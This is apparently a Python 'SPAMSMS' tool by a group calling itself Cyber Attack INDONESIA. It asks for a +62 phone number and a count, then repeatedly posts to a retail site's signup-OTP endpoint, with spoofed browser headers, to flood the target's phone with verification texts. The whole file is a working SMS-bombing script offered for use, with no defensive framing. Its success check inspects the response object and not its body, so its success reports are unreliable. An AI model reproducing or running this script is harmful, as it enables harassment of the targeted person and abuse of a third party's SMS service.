import json
import requests
import os
import sys
def main():
	os.system('clear')
	os.system('figlet SPAMSMS | lolcat')
	banner = '''
[×] Author : M̶R̶A̶d̶i̶a̶r̶a̶a̶a̶-0̶8̶7
[×] Team   : Cyber Attack INDONESIA
<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>'''















	print(banner)
	no = input('[•] Target : 62')
	jum = input('[•] Jumlah SPAM : ')
	print('Loading.....')
	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; ASUS_X00RD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}


	dat = {
	'phone': no
	}


	for x in range(int(jum)):
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
		if 'error' in leosureo:
			print('[×] Gagal Mengirim '+ no)
		else:
			print(' Succes Send To +62'+ no)


main()
